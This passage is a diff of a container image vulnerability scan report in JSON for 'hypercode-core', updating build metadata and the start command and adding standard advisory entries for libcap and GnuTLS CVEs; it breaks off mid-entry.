@@ -1,6 +1,6 @@
 {
   "SchemaVersion": 2,
-  "CreatedAt": "2026-05-01T00:11:39.36861774Z",
+  "CreatedAt": "2026-05-11T09:52:08.530206641Z",
   "ArtifactName": "hypercode-core:latest",
   "ArtifactType": "container_image",
   "Metadata": {
@@ -8,32 +8,32 @@
       "Family": "debian",
       "Name": "13.4"
     },
-    "ImageID": "sha256:71d1d218aaf5a0c494ba9ecb44c34ff73c572c1775427bc49e3774c3ce6eac64",
+    "ImageID": "sha256:7cc3a34ba4382b42470c70d6b04e4edee38e347b3f794a97c1db9e4307ee7630",
     "DiffIDs": [
       "sha256:6d7c150df58d41c351cd9b03f1cda7a9a23d6fc91436e2bf0f098c6dd78c9c55",
       "sha256:fa1aec8230350aec33b1ea2bf41dcab77f0cac7e509ee344dae49cb5098e4f27",
       "sha256:248c30140986d3a122b24d7f494e47c7b94c0012fa719553af79e2b64648bd7a",
       "sha256:2360b28b46605ab7f59674ea7647861778e22bd6f2442d1fdfb04a93787028d7",
-      "sha256:bb7aee06f251cdfb9304f793cee6287a9b50e4a18f8d7063a85f5967ea9b61e9",
-      "sha256:f96f78c3d107966032e0898af9609150c3bbf5678bcd4016719518f1674d63b3",
-      "sha256:1497706eda8d4f6c926ba66685bf4845f7354200b6b5066bd0d337a245c6f7d5",
-      "sha256:110378254aa32740fabc55085aa941f3eef71d9388327c2fb36ac29f8b1696ed",
-      "sha256:156bf93b371fc0ad60ccfc15b8349e1f8bdbb382a0a101e4525bb57fb315ac92",
-      "sha256:edc8a1987802a0a9a533acbd1e55d93e632f66ae3cbcfd3afb07915f62ce60eb",
-      "sha256:23ef5279d26dec7ee84ec0949b13ea93ce9876be52ec1ad7a7559e4fe30642fb",
-      "sha256:1f57aaafd94feffd910f77fb8322d13bbabee81f4f2472309450097594491660",
-      "sha256:5864767b3eb0f826eed90c81129261d6b1a107166be6b0468c94ad0e1eb12924",
-      "sha256:81d182b9e727cf071ffe9661358a5f7ccb30be2123144e6c9a62b734bc8ba646"
+      "sha256:9976492e84b333d7fa789ebb3be9b62c82d1533e8c31c8d054743142800d28a6",
+      "sha256:95dc24ca65ce2fd397687805c7e114b2d0b0bb2e601aefcefa3c3c2817e605bc",
+      "sha256:ed87dc51ccfa470476e2d06090a941d50ccd91d60c2fb8c8c84b55bd299f6a8a",
+      "sha256:783800c113f3ae5d0cabb6c77e732eb81174e751e2c49b500cbe26b61b814575",
+      "sha256:a514df29f02c488cb092f2e4ed7ad54bd3ca954e529bf1d534ac635021e4b5bc",
+      "sha256:69fc21d9b19807c563f925dca94eb77918336d4cf00cd82bc4d247de3d8f7c69",
+      "sha256:d4afc1204b59f8cb32fa6e97a8f62197c21dfe89ff82566849ad6111e0069d6b",
+      "sha256:3bd4bac07620227dcee3dfcf40515dc8cf78db7534e2ff9887e457ab74c3416f",
+      "sha256:309a7e5188eac27f0bf80a09a094dedea3bc83818f74588d68c68f3af7bff4cf",
+      "sha256:c37a3e7cdb382c547a6bcc1a48f6fd64398a94456f52d240f570ff01b49335c3"
     ],
     "RepoTags": [
       "hypercode-core:latest"
     ],
     "RepoDigests": [
-      "hypercode-core@sha256:71d1d218aaf5a0c494ba9ecb44c34ff73c572c1775427bc49e3774c3ce6eac64"
+      "hypercode-core@sha256:7cc3a34ba4382b42470c70d6b04e4edee38e347b3f794a97c1db9e4307ee7630"
     ],
     "ImageConfig": {
       "architecture": "amd64",
-      "created": "2026-04-29T20:40:50.539148466Z",
+      "created": "2026-05-05T08:33:42.727651697Z",
       "history": [
         {
           "created": "2026-04-21T00:00:00Z",
@@ -92,106 +92,106 @@
           "empty_layer": true
         },
         {
-          "created": "2026-04-23T17:16:13Z",
+          "created": "2026-05-05T07:49:55Z",
           "created_by": "WORKDIR /app",
           "comment": "buildkit.dockerfile.v0"
         },
         {
-          "created": "2026-04-29T15:24:40Z",
+          "created": "2026-05-05T07:50:23Z",
           "created_by": "ENV PYTHONDONTWRITEBYTECODE=1",
           "comment": "buildkit.dockerfile.v0",
           "empty_layer": true
         },
         {
-          "created": "2026-04-29T15:24:40Z",
+          "created": "2026-05-05T07:50:23Z",
           "created_by": "ENV PYTHONUNBUFFERED=1",
           "comment": "buildkit.dockerfile.v0",
           "empty_layer": true
         },
         {
-          "created": "2026-04-29T15:24:40Z",
+          "created": "2026-05-05T07:50:23Z",
           "created_by": "ENV HF_HOME=/app/cache/huggingface",
           "comment": "buildkit.dockerfile.v0",
           "empty_layer": true
         },
         {
-          "created": "2026-04-29T15:24:40Z",
+          "created": "2026-05-05T07:50:23Z",
           "created_by": "ENV SENTENCE_TRANSFORMERS_HOME=/app/cache/sentence_transformers",
           "comment": "buildkit.dockerfile.v0",
           "empty_layer": true
         },
         {
-          "created": "2026-04-29T15:24:40Z",
+          "created": "2026-05-05T07:50:23Z",
           "created_by": "ARG INSTALL_AI_DEPS=false",
           "comment": "buildkit.dockerfile.v0",
           "empty_layer": true
         },
         {
-          "created": "2026-04-29T15:24:40Z",
+          "created": "2026-05-05T07:50:23Z",
           "created_by": "RUN |1 INSTALL_AI_DEPS=false /bin/sh -c apt-get update --allow-releaseinfo-change \u0026\u0026     apt-get install -y --no-install-recommends         libpq5         curl         ca-certificates         libexpat1         openssl \u0026\u0026     apt-get clean \u0026\u0026     rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/* # buildkit",
           "comment": "buildkit.dockerfile.v0"
         },
         {
-          "created": "2026-04-29T15:25:11Z",
+          "created": "2026-05-05T07:50:41Z",
           "created_by": "RUN |1 INSTALL_AI_DEPS=false /bin/sh -c pip install --upgrade --no-cache-dir     \"pip==26.0.1\"     \"setuptools\u003e=80.0.0\"     \"wheel==0.46.2\"     \"jaraco.context\u003e=6.0.0\"     \"jaraco.functools\u003e=4.1.0\"     \"jaraco.text\u003e=4.0.0\" # buildkit",
           "comment": "buildkit.dockerfile.v0"
         },
         {
-          "created": "2026-04-29T15:25:12Z",
+          "created": "2026-05-05T07:50:43Z",
           "created_by": "RUN |1 INSTALL_AI_DEPS=false /bin/sh -c addgroup --system appuser \u0026\u0026 adduser --system --group appuser # buildkit",
           "comment": "buildkit.dockerfile.v0"
         },
         {
-          "created": "2026-04-29T15:25:13Z",
+          "created": "2026-05-05T07:50:44Z",
           "created_by": "RUN |1 INSTALL_AI_DEPS=false /bin/sh -c mkdir -p /app/cache/huggingface /app/cache/sentence_transformers \u0026\u0026     chown -R appuser:appuser /app/cache # buildkit",
           "comment": "buildkit.dockerfile.v0"
         },
         {
-          "created": "2026-04-29T15:36:59Z",
+          "created": "2026-05-05T07:59:36Z",
           "created_by": "COPY /usr/local/lib/python3.11/site-packages /usr/local/lib/python3.11/site-packages # buildkit",
           "comment": "buildkit.dockerfile.v0"
         },
         {
-          "created": "2026-04-29T15:37:04Z",
+          "created": "2026-05-05T07:59:39Z",
           "created_by": "COPY /usr/local/bin /usr/local/bin # buildkit",
           "comment": "buildkit.dockerfile.v0"
         },
         {
-          "created": "2026-04-29T20:40:41Z",
+          "created": "2026-05-05T08:33:30Z",
           "created_by": "COPY . . # buildkit",
           "comment": "buildkit.dockerfile.v0"
         },
         {
-          "created": "2026-04-29T20:40:45Z",
+          "created": "2026-05-05T08:33:34Z",
           "created_by": "RUN |1 INSTALL_AI_DEPS=false /bin/sh -c python -c \"import glob, os, shutil, setuptools; vendor=os.path.join(os.path.dirname(setuptools.__file__), '_vendor'); [shutil.rmtree(p, ignore_errors=True) for p in glob.glob(os.path.join(vendor, 'wheel-*.dist-info'))]; shutil.rmtree(os.path.join(vendor, 'bin'), ignore_errors=True)\" # buildkit",
           "comment": "buildkit.dockerfile.v0"
         },
         {
-          "created": "2026-04-29T20:40:50Z",
+          "created": "2026-05-05T08:33:42Z",
           "created_by": "RUN |1 INSTALL_AI_DEPS=false /bin/sh -c chown -R appuser:appuser /app # buildkit",
           "comment": "buildkit.dockerfile.v0"
         },
         {
-          "created": "2026-04-29T20:40:50Z",
+          "created": "2026-05-05T08:33:42Z",
           "created_by": "USER appuser",
           "comment": "buildkit.dockerfile.v0",
           "empty_layer": true
         },
         {
-          "created": "2026-04-29T20:40:50Z",
+          "created": "2026-05-05T08:33:42Z",
           "created_by": "EXPOSE [8000/tcp]",
           "comment": "buildkit.dockerfile.v0",
           "empty_layer": true
         },
         {
-          "created": "2026-04-29T20:40:50Z",
+          "created": "2026-05-05T08:33:42Z",
           "created_by": "HEALTHCHECK \u0026{[\"CMD-SHELL\" \"sh -c 'curl -f \\\"http://localhost:${PORT:-8000}/health\\\" || exit 1'\"] \"30s\" \"10s\" \"0s\" \"0s\" '\\x03'}",
           "comment": "buildkit.dockerfile.v0",
           "empty_layer": true
         },
         {
-          "created": "2026-04-29T20:40:50Z",
-          "created_by": "CMD [\"sh\" \"-c\" \"(alembic upgrade head || true) \u0026 exec python -m uvicorn app.main:app --host 0.0.0.0 --port ${PORT:-8000}\"]",
+          "created": "2026-05-05T08:33:42Z",
+          "created_by": "CMD [\"sh\" \"-c\" \"alembic upgrade head \u0026\u0026 exec python -m uvicorn app.main:app --host :: --port ${PORT:-8000}\"]",
           "comment": "buildkit.dockerfile.v0",
           "empty_layer": true
         }
@@ -204,23 +204,23 @@
           "sha256:fa1aec8230350aec33b1ea2bf41dcab77f0cac7e509ee344dae49cb5098e4f27",
           "sha256:248c30140986d3a122b24d7f494e47c7b94c0012fa719553af79e2b64648bd7a",
           "sha256:2360b28b46605ab7f59674ea7647861778e22bd6f2442d1fdfb04a93787028d7",
-          "sha256:bb7aee06f251cdfb9304f793cee6287a9b50e4a18f8d7063a85f5967ea9b61e9",
-          "sha256:f96f78c3d107966032e0898af9609150c3bbf5678bcd4016719518f1674d63b3",
-          "sha256:1497706eda8d4f6c926ba66685bf4845f7354200b6b5066bd0d337a245c6f7d5",
-          "sha256:110378254aa32740fabc55085aa941f3eef71d9388327c2fb36ac29f8b1696ed",
-          "sha256:156bf93b371fc0ad60ccfc15b8349e1f8bdbb382a0a101e4525bb57fb315ac92",
-          "sha256:edc8a1987802a0a9a533acbd1e55d93e632f66ae3cbcfd3afb07915f62ce60eb",
-          "sha256:23ef5279d26dec7ee84ec0949b13ea93ce9876be52ec1ad7a7559e4fe30642fb",
-          "sha256:1f57aaafd94feffd910f77fb8322d13bbabee81f4f2472309450097594491660",
-          "sha256:5864767b3eb0f826eed90c81129261d6b1a107166be6b0468c94ad0e1eb12924",
-          "sha256:81d182b9e727cf071ffe9661358a5f7ccb30be2123144e6c9a62b734bc8ba646"
+          "sha256:9976492e84b333d7fa789ebb3be9b62c82d1533e8c31c8d054743142800d28a6",
+          "sha256:95dc24ca65ce2fd397687805c7e114b2d0b0bb2e601aefcefa3c3c2817e605bc",
+          "sha256:ed87dc51ccfa470476e2d06090a941d50ccd91d60c2fb8c8c84b55bd299f6a8a",
+          "sha256:783800c113f3ae5d0cabb6c77e732eb81174e751e2c49b500cbe26b61b814575",
+          "sha256:a514df29f02c488cb092f2e4ed7ad54bd3ca954e529bf1d534ac635021e4b5bc",
+          "sha256:69fc21d9b19807c563f925dca94eb77918336d4cf00cd82bc4d247de3d8f7c69",
+          "sha256:d4afc1204b59f8cb32fa6e97a8f62197c21dfe89ff82566849ad6111e0069d6b",
+          "sha256:3bd4bac07620227dcee3dfcf40515dc8cf78db7534e2ff9887e457ab74c3416f",
+          "sha256:309a7e5188eac27f0bf80a09a094dedea3bc83818f74588d68c68f3af7bff4cf",
+          "sha256:c37a3e7cdb382c547a6bcc1a48f6fd64398a94456f52d240f570ff01b49335c3"
         ]
       },
       "config": {
         "Cmd": [
           "sh",
           "-c",
-          "(alembic upgrade head || true) \u0026 exec python -m uvicorn app.main:app --host 0.0.0.0 --port ${PORT:-8000}"
+          "alembic upgrade head \u0026\u0026 exec python -m uvicorn app.main:app --host :: --port ${PORT:-8000}"
         ],
         "Healthcheck": {
           "Test": [
@@ -260,6 +260,82 @@
       "Type": "debian",
       "Vulnerabilities": [
         {
+          "VulnerabilityID": "CVE-2026-4878",
+          "PkgID": "libcap2@1:2.75-10+b8",
+          "PkgName": "libcap2",
+          "PkgIdentifier": {
+            "PURL": "pkg:deb/debian/libcap2@2.75-10%2Bb8?arch=amd64\u0026distro=debian-13.4\u0026epoch=1",
+            "UID": "d2c376501f6396f0"
+          },
+          "InstalledVersion": "1:2.75-10+b8",
+          "Status": "affected",
+          "Layer": {
+            "Digest": "sha256:3531af2bc2a9c8883754652783cf96207d53189db279c9637b7157d034de7ecd",
+            "DiffID": "sha256:6d7c150df58d41c351cd9b03f1cda7a9a23d6fc91436e2bf0f098c6dd78c9c55"
+          },
+          "SeveritySource": "nvd",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-4878",
+          "DataSource": {
+            "ID": "debian",
+            "Name": "Debian Security Tracker",
+            "URL": "https://salsa.debian.org/security-tracker-team/security-tracker"
+          },
+          "Title": "libcap: libcap: Privilege escalation via TOCTOU race condition in cap_set_file()",
+          "Description": "A flaw was found in libcap. A local unprivileged user can exploit a Time-of-check-to-time-of-use (TOCTOU) race condition in the `cap_set_file()` function. This allows an attacker with write access to a parent directory to redirect file capability updates to an attacker-controlled file. By doing so, capabilities can be injected into or stripped from unintended executables, leading to privilege escalation.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-367"
+          ],
+          "VendorSeverity": {
+            "alma": 3,
+            "azure": 2,
+            "nvd": 3,
+            "oracle-oval": 3,
+            "redhat": 3,
+            "rocky": 3,
+            "ubuntu": 2
+          },
+          "CVSS": {
+            "nvd": {
+              "V3Vector": "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H",
+              "V3Score": 7
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:U/C:H/I:H/A:H",
+              "V3Score": 6.7
+            }
+          },
+          "References": [
+            "http://www.openwall.com/lists/oss-security/2026/04/07/14",
+            "http://www.openwall.com/lists/oss-security/2026/04/07/4",
+            "http://www.openwall.com/lists/oss-security/2026/04/08/9",
+            "http://www.openwall.com/lists/oss-security/2026/04/09/5",
+            "http://www.openwall.com/lists/oss-security/2026/04/09/6",
+            "https://access.redhat.com/errata/RHSA-2026:12423",
+            "https://access.redhat.com/errata/RHSA-2026:12441",
+            "https://access.redhat.com/errata/RHSA-2026:13285",
+            "https://access.redhat.com/errata/RHSA-2026:14162",
+            "https://access.redhat.com/errata/RHSA-2026:14937",
+            "https://access.redhat.com/errata/RHSA-2026:7473",
+            "https://access.redhat.com/security/cve/CVE-2026-4878",
+            "https://bugzilla.redhat.com/2451615",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2447554",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2451615",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-4878",
+            "https://errata.almalinux.org/9/ALSA-2026-12441.html",
+            "https://errata.rockylinux.org/RLSA-2026:13285",
+            "https://github.com/AndrewGMorgan/libcap_mirror/security/advisories/GHSA-f78v-p5hx-m7hh",
+            "https://linux.oracle.com/cve/CVE-2026-4878.html",
+            "https://linux.oracle.com/errata/ELSA-2026-13285.html",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-4878",
+            "https://sites.google.com/site/fullycapable/release-notes-for-libcap#h.x4zn8j3lss6r",
+            "https://ubuntu.com/security/notices/USN-8193-1",
+            "https://www.cve.org/CVERecord?id=CVE-2026-4878"
+          ],
+          "PublishedDate": "2026-04-09T16:16:31.987Z",
+          "LastModifiedDate": "2026-05-07T22:16:36.237Z"
+        },
+        {
           "VulnerabilityID": "CVE-2026-25210",
           "PkgID": "libexpat1@2.7.1-2",
           "PkgName": "libexpat1",
@@ -270,8 +346,8 @@
           "InstalledVersion": "2.7.1-2",
           "Status": "affected",
           "Layer": {
-            "Digest": "sha256:c2be8a91e98bb0fe60e1017e2b06ab2e71b0e3eb6eaabfcab46ab999f94ae887",
-            "DiffID": "sha256:f96f78c3d107966032e0898af9609150c3bbf5678bcd4016719518f1674d63b3"
+            "Digest": "sha256:d8fecfe3e027d286c17c778d50aa6273a202169940ae7291e9e08ba011756482",
+            "DiffID": "sha256:95dc24ca65ce2fd397687805c7e114b2d0b0bb2e601aefcefa3c3c2817e605bc"
           },
           "SeveritySource": "nvd",
           "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-25210",
@@ -319,6 +395,242 @@
           "LastModifiedDate": "2026-03-10T18:17:12.78Z"
         },
         {
+          "VulnerabilityID": "CVE-2026-33845",
+          "PkgID": "libgnutls30t64@3.8.9-3+deb13u2",
+          "PkgName": "libgnutls30t64",
+          "PkgIdentifier": {
+            "PURL": "pkg:deb/debian/libgnutls30t64@3.8.9-3%2Bdeb13u2?arch=amd64\u0026distro=debian-13.4",
+            "UID": "5f384f528c31fbfe"
+          },
+          "InstalledVersion": "3.8.9-3+deb13u2",
+          "Status": "affected",
+          "Layer": {
+            "Digest": "sha256:d8fecfe3e027d286c17c778d50aa6273a202169940ae7291e9e08ba011756482",
+            "DiffID": "sha256:95dc24ca65ce2fd397687805c7e114b2d0b0bb2e601aefcefa3c3c2817e605bc"
+          },
+          "SeveritySource": "nvd",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-33845",
+          "DataSource": {
+            "ID": "debian",
+            "Name": "Debian Security Tracker",
+            "URL": "https://salsa.debian.org/security-tracker-team/security-tracker"
+          },
+          "Title": "gnutls: GnuTLS: Denial of Service via DTLS zero-length fragment",
+          "Description": "A flaw in GnuTLS DTLS handshake parsing allows malformed fragments with zero length and non-zero offset, leading to an integer underflow during reassembly and resulting in an out-of-bounds read. This issue is remotely exploitable and may cause information disclosure or denial of service.",
+          "Severity": "CRITICAL",
+          "CweIDs": [
+            "CWE-191"
+          ],
+          "VendorSeverity": {
+            "nvd": 4,
+            "redhat": 3
+          },
+          "CVSS": {
+            "nvd": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H",
+              "V3Score": 9.1
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/errata/RHSA-2026:13274",
+            "https://access.redhat.com/security/cve/CVE-2026-33845",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2450624",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-33845",
+            "https://www.cve.org/CVERecord?id=CVE-2026-33845"
+          ],
+          "PublishedDate": "2026-04-30T18:16:28.003Z",
+          "LastModifiedDate": "2026-05-05T03:03:19.247Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-33846",
+          "PkgID": "libgnutls30t64@3.8.9-3+deb13u2",
+          "PkgName": "libgnutls30t64",
+          "PkgIdentifier": {
+            "PURL": "pkg:deb/debian/libgnutls30t64@3.8.9-3%2Bdeb13u2?arch=amd64\u0026distro=debian-13.4",
+            "UID": "5f384f528c31fbfe"
+          },
+          "InstalledVersion": "3.8.9-3+deb13u2",
+          "Status": "affected",
+          "Layer": {
+            "Digest": "sha256:d8fecfe3e027d286c17c778d50aa6273a202169940ae7291e9e08ba011756482",
+            "DiffID": "sha256:95dc24ca65ce2fd397687805c7e114b2d0b0bb2e601aefcefa3c3c2817e605bc"
+          },
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-33846",
+          "DataSource": {
+            "ID": "debian",
+            "Name": "Debian Security Tracker",
+            "URL": "https://salsa.debian.org/security-tracker-team/security-tracker"
+          },
+          "Title": "gnutls: GnuTLS: Denial of Service via heap buffer overflow in DTLS handshake fragment reassembly",
+          "Description": "A heap buffer overflow vulnerability exists in the DTLS handshake fragment reassembly logic of GnuTLS. The issue arises in merge_handshake_packet() where incoming handshake fragments are matched and merged based solely on handshake type, without validating that the message_length field remains consistent across all fragments of the same logical message. An attacker can exploit this by sending crafted DTLS fragments with conflicting message_length values, causing the implementation to allocate a buffer based on a smaller initial fragment and subsequently write beyond its bounds using larger, inconsistent fragments. Because the merge operation does not enforce proper bounds checking against the allocated buffer size, this results in an out-of-bounds write on the heap. The vulnerability is remotely exploitable without authentication via the DTLS handshake path and can lead to application crashes or potential memory corruption.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-130"
+          ],
+          "VendorSeverity": {
+            "redhat": 3
+          },
+          "CVSS": {
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/errata/RHSA-2026:13274",
+            "https://access.redhat.com/security/cve/CVE-2026-33846",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2450625",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-33846",
+            "https://www.cve.org/CVERecord?id=CVE-2026-33846"
+          ],
+          "PublishedDate": "2026-05-04T10:15:59.69Z",
+          "LastModifiedDate": "2026-05-04T15:22:52.85Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-3833",
+          "PkgID": "libgnutls30t64@3.8.9-3+deb13u2",
+          "PkgName": "libgnutls30t64",
+          "PkgIdentifier": {
+            "PURL": "pkg:deb/debian/libgnutls30t64@3.8.9-3%2Bdeb13u2?arch=amd64\u0026distro=debian-13.4",
+            "UID": "5f384f528c31fbfe"
+          },
+          "InstalledVersion": "3.8.9-3+deb13u2",
+          "Status": "affected",
+          "Layer": {
+            "Digest": "sha256:d8fecfe3e027d286c17c778d50aa6273a202169940ae7291e9e08ba011756482",
+            "DiffID": "sha256:95dc24ca65ce2fd397687805c7e114b2d0b0bb2e601aefcefa3c3c2817e605bc"
+          },
+          "SeveritySource": "nvd",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-3833",
+          "DataSource": {
+            "ID": "debian",
+            "Name": "Debian Security Tracker",
+            "URL": "https://salsa.debian.org/security-tracker-team/security-tracker"
+          },
+          "Title": "gnutls: GnuTLS: Policy bypass due to case-sensitive nameConstraints comparison",
+          "Description": "A flaw was found in gnutls. This vulnerability occurs because gnutls performs case-sensitive comparisons of `nameConstraints` labels, specifically for `dNSName` (DNS) or `rfc822Name` (email) constraints within `excludedSubtrees` or `permittedSubtrees`. A remote attacker can exploit this by crafting a leaf certificate with casing differences in the Subject Alternative Name (SAN), leading to a policy bypass where a certificate that should be rejected is instead accepted. This could result in unauthorized access or information disclosure.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-178"
+          ],
+          "VendorSeverity": {
+            "nvd": 3,
+            "redhat": 2
+          },
+          "CVSS": {
+            "nvd": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
+              "V3Score": 7.4
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
+              "V3Score": 6.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/errata/RHSA-2026:13274",
+            "https://access.redhat.com/security/cve/CVE-2026-3833",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2445763",
+            "https://gitlab.com/gnutls/gnutls/-/issues/1803",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-3833",
+            "https://www.cve.org/CVERecord?id=CVE-2026-3833"
+          ],
+          "PublishedDate": "2026-04-30T18:16:30.577Z",
+          "LastModifiedDate": "2026-05-07T02:09:04.47Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-42010",
+          "PkgID": "libgnutls30t64@3.8.9-3+deb13u2",
+          "PkgName": "libgnutls30t64",
+          "PkgIdentifier": {
+            "PURL": "pkg:deb/debian/libgnutls30t64@3.8.9-3%2Bdeb13u2?arch=amd64\u0026distro=debian-13.4",
+            "UID": "5f384f528c31fbfe"
+          },
+          "InstalledVersion": "3.8.9-3+deb13u2",
+          "Status": "affected",
+          "Layer": {
+            "Digest": "sha256:d8fecfe3e027d286c17c778d50aa6273a202169940ae7291e9e08ba011756482",
+            "DiffID": "sha256:95dc24ca65ce2fd397687805c7e114b2d0b0bb2e601aefcefa3c3c2817e605bc"
+          },
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-42010",
+          "DataSource": {
+            "ID": "debian",
+            "Name": "Debian Security Tracker",
+            "URL": "https://salsa.debian.org/security-tracker-team/security-tracker"
+          },
+          "Title": "gnutls: gnutls: Authentication Bypass via NUL Character in Username",
+          "Description": "A flaw was found in gnutls. Servers configured with RSA-PSK (Rivest–Shamir–Adleman – Pre-Shared Key) wrongfully matched usernames containing a NUL character with truncated usernames. A remote attacker could exploit this by sending a specially crafted username, leading to an authentication bypass. This vulnerability allows an attacker to gain unauthorized access by circumventing the authentication process.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-626"
+          ],
+          "VendorSeverity": {
+            "redhat": 3
+          },
+          "CVSS": {
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N",
+              "V3Score": 7.1
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-42010",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2467289",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-42010",
+            "https://www.cve.org/CVERecord?id=CVE-2026-42010"
+          ],
+          "PublishedDate": "2026-05-07T12:16:17.977Z",
+          "LastModifiedDate": "2026-05-07T15:16:09.64Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-42011",
+          "PkgID": "libgnutls30t64@3.8.9-3+deb13u2",
+          "PkgName": "libgnutls30t64",
+          "PkgIdentifier": {
+            "PURL": "pkg:deb/debian/libgnutls30t64@3.8.9-3%2Bdeb13u2?arch=amd64\u0026distro=debian-13.4",
+            "UID": "5f384f528c31fbfe"
+          },
+          "InstalledVersion": "3.8.9-3+deb13u2",
+          "Status": "affected",
+          "Layer": {
+            "Digest": "sha256:d8fecfe3e027d286c17c778d50aa6273a202169940ae7291e9e08ba011756482",
+            "DiffID": "sha256:95dc24ca65ce2fd397687805c7e114b2d0b0bb2e601aefcefa3c3c2817e605bc"
+          },
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-42011",
+          "DataSource": {
+            "ID": "debian",
+            "Name": "Debian Security Tracker",
+            "URL": "https://salsa.debian.org/security-tracker-team/security-tracker"
+          },
+          "Title": "gnutls: gnutls: Security bypass due to incorrect name constraint handling",
+          "Description": "A flaw was found in gnutls. This vulnerability occurs because permitted name constraints were incorrectly ignored when previous Certificate Authorities (CAs) only had excluded name constraints. A remote attacker could exploit this to bypass critical name constraint checks during certificate validation. This bypass could lead to the acceptance of invalid certificates, potentially enabling spoofing or man-in-the-middle attacks against affected systems.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-295"
+          ],
+          "VendorSeverity": {
+            "redhat": 2
+          },
+          "CVSS": {
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
+              "V3Score": 7.4
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-42011",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2467437",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-42011",
+            "https://www.cve.org/CVERecord?id=CVE-2026-42011"
+          ],
+          "PublishedDate": "2026-05-07T15:16:09.76Z",
+          "LastModifiedDate": "2026-05-07T15:48:55.55Z"
+        },
+        {
           "VulnerabilityID": "CVE-2025-69720",
           "PkgID": "libncursesw6@6.5+20250216-2",
           "PkgName": "libncursesw6",
@@ -352,6 +664,7 @@
             "cbl-mariner": 4,
             "nvd": 3,
             "oracle-oval": 2,
+            "photon": 3,
             "redhat": 2,
             "rocky": 2
           },
@@ -398,8 +711,8 @@
           "InstalledVersion": "1.64.0-1.1",
           "Status": "affected",
           "Layer": {
-            "Digest": "sha256:c2be8a91e98bb0fe60e1017e2b06ab2e71b0e3eb6eaabfcab46ab999f94ae887",
-            "DiffID": "sha256:f96f78c3d107966032e0898af9609150c3bbf5678bcd4016719518f1674d63b3"
+            "Digest": "sha256:d8fecfe3e027d286c17c778d50aa6273a202169940ae7291e9e08ba011756482",
+            "DiffID": "sha256:95dc24ca65ce2fd397687805c7e114b2d0b0bb2e601aefcefa3c3c2817e605bc"
           },
           "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-27135",
           "DataSource": {
@@ -421,7 +734,8 @@
             "oracle-oval": 3,
             "photon": 3,
             "redhat": 3,
-            "rocky": 3
+            "rocky": 3,
+            "ubuntu": 2
           },
           "CVSS": {
             "redhat": {
@@ -440,16 +754,69 @@
             "https://bugzilla.redhat.com/show_bug.cgi?id=2448754",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-27135",
             "https://errata.almalinux.org/9/ALSA-2026-7896.html",
-            "https://errata.rockylinux.org/RLSA-2026:7668",
+            "https://errata.rockylinux.org/RLSA-2026:7667",
             "https://github.com/nghttp2/nghttp2/commit/5c7df8fa815ac1004d9ecb9d1f7595c4d37f46e1",
             "https://github.com/nghttp2/nghttp2/security/advisories/GHSA-6933-cjhr-5qg6",
             "https://linux.oracle.com/cve/CVE-2026-27135.html",
             "https://linux.oracle.com/errata/ELSA-2026-8339.html",
             "https://nvd.nist.gov/vuln/detail/CVE-2026-27135",
+            "https://ubuntu.com/security/notices/USN-8233-1",
+            "https://ubuntu.com/security/notices/USN-8233-2",
             "https://www.cve.org/CVERecord?id=CVE-2026-27135"
           ],
           "PublishedDate": "2026-03-18T18:16:26.723Z",
           "LastModifiedDate": "2026-03-23T17:51:17.017Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-7598",
